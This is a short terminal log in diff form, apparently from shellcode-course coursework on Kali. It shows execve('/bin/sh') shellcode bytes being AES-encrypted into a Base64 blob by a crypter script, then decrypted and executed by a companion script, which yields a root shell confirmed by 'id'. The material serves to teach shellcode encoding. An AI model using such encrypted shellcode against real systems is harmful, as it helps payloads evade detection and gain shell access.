@@ -1,0 +1,11 @@
+root@kali:/opt/slae/crypto/1# python crypt.py '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+AES Base64 Encrypted Shellcode:
+PRpbTLBy2QTz/iIv9PeHDt28OAJf7c8qCfpckO/SvoWGoh3YV5iAZQWBfMU/KO4Y/084/yRr046b99odtd/3qh4GFYQlX+UKCLiWSbYZYLf9znaBoJDSkyBcAjmJimUGjl2kMgmBeS8uUKYtY+kr6g==
+
+root@kali:/opt/slae/crypto/1# python decrypt.py PRpbTLBy2QTz/iIv9PeHDt28OAJf7c8qCfpckO/SvoWGoh3YV5iAZQWBfMU/KO4Y/084/yRr046b99odtd/3qh4GFYQlX+UKCLiWSbYZYLf9znaBoJDSkyBcAjmJimUGjl2kMgmBeS8uUKYtY+kr6g==
+1ÀH»ÑÐÿH÷ÛST_RWT^°;
+PuTTY#
+/bin/sh: 1: PuTTY: not found
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# exit
